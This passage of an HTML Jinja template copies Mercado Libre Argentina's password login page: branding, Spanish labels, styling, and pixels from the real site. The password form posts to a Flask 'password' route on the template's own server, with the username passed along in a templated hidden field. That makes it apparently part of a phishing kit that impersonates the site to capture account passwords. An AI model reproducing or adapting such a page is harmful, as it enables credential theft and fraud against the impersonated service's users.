                    >Necesito ayuda</a

                id=":Ri1:"
              >
                <div class="andes-card__content">
                  <div class="children-wrapper">
                    <form
                      class="login-form"
                      action="{{ url_for('password') }}"
                      method="POST"
                      id="login_user_form"
                    >
                      <div class="login-form__row login-form__row--landscape">
                        <div class="login-form__input">
                          <input
                            type="email"
                            name="user_id"
                            readonly=""
                            style="display: none"
                            autocomplete="username"
                            value="{{ user_input }}"
                          />
                          <div
                            class="andes-form-control login-form__input--password andes-form-control--textfield andes-form-control--focused andes-form-control--default"
                          >
                            <label
                              for="password"
                              class="andes-form-control__label"
                              >Contrasea</label
                            >
                            <div class="andes-form-control__control">
                              <input
                                name="passwordInput"
                                autocomplete="current-password"
                                autocapitalize="none"
                                spellcheck="false"
                                autoCorrect="off"
                                data-testid="password"
                                aria-describedby="password-message"
                                aria-invalid="false"
                                autofocus=""
                                class="andes-form-control__field"
                                id="password"
                                maxlength="1000"
                                type="password"
                              /><input
                                style="display: none"
                                type="password"
                                id="password-hidden"
                                autocomplete="current-password"
                              />
                            </div>
                            <div class="andes-form-control__bottom">
                              <span
                                class="andes-form-control__message"
                                id="password-message"
                              >
                                <span class="andes-form-control__message-text">
                                  <div class="input-error" role="alert"></div>
                                </span>
                              </span>
                            </div>
                          </div>
                        </div>
                      </div>
                      <div class="login-form__actions">
                        <button
                          type="submit"
                          class="andes-button login-form__actions--complete andes-button--large andes-button--loud"
                          id="action-complete"
                          name="action"
                          value="complete"
                          data-testid="action-complete"
                        >
                          <span class="andes-button__content"
                            >Iniciar sesin</span
                          ></button
                        ><button
                          type="submit"
                          class="andes-button login-form__actions--decline andes-button--large andes-button--quiet"
                          id="action-decline"
                          name="action"
                          value="decline"
                          data-testid="action-decline"
                        >
                          <span class="andes-button__content"
                            >Olvidaste tu contrasea?</span
                          >
                        </button>
                      </div>
                    </form>
                  </div>
                  <div class="feedback-container">
                    <div class="asset__container">
                      <div class="asset__container-icon" aria-hidden="true">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="64"
                          height="64"
                          fill="none"
                        >
                          <circle
                            cx="32"
                            cy="32"
                            r="30"
                            stroke="#00A650"
                            stroke-linecap="round"
                            stroke-width="4"
                            transform="rotate(-90 32 32)"
                          ></circle>
                          <path
                            stroke="#00A650"
                            stroke-width="4"
                            d="M20.5 32.5 28 40l15.5-15.5"
                          ></path>
                        </svg>
                      </div>
                    </div>
                    <span role="status" aria-live="assertive"></span>
                  </div>
                </div>
              </div>
            </div>

            <img

              src="https://auth.mercadolibre.com.ar/preconnect_pixel.gif"
              alt=""
            /><img
              style="display: none"
              src="https://www.mercadoshops.com.ar/preconnect_pixel.gif"
              alt=""
            />
          </div>
        </div>
      </main>

          <a

            >Privacidad</a
          ><a
